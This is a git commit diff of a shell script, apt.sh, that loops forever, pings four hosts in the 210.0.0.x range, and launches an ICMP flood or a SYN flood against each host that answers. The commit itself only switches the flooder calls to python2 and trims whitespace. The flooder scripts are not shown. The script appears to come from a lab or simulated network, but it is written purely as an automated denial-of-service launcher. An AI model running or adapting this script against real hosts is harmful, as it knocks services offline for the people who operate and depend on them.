71be1a02fdb5836fb59e8952d5cbb34e0cdf5ce3
Iman Akbari <imakbari@gmail.com>
2019-09-19 22:09:51 -0400

    Use python2 for ICMP

--- apt.sh
+++ apt.sh
@@ -1,22 +1,22 @@
-while true; do 
+while true; do
 	if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
 	then
 			echo "Bhost 1 found - ICMP attack"
-			python icmp/icmp-flooder_simple.py 210.0.0.101 & 
+			python2 icmp/icmp-flooder_simple.py 210.0.0.101 &
 	fi
 	if (( ping 210.0.0.102 -c 1 | grep -q 'from'))
 	then
 			echo "Bhost 2 found - ICMP attack"
-			python icmp/icmp-flooder_simple.py 210.0.0.102 &
+			python2 icmp/icmp-flooder_simple.py 210.0.0.102 &
 	fi
 
 	if (( ping 210.0.0.103 -c 1 | grep -q 'from'))
 	then
 			echo "Bhost 3 found - SYN attack"
-			sh syn-flood/flooder_simple.sh 210.0.0.103 1234 & 
-	fi 
-	if (( ping 210.0.0.104 -c 1 | grep -q 'from'))          
-	then    
+			sh syn-flood/flooder_simple.sh 210.0.0.103 1234 &
+	fi
+	if (( ping 210.0.0.104 -c 1 | grep -q 'from'))
+	then
 			echo "Bhost 4 found - SYN attack"
 			sh syn-flood/flooder_simple.sh 210.0.0.104 1234 &
 	fi
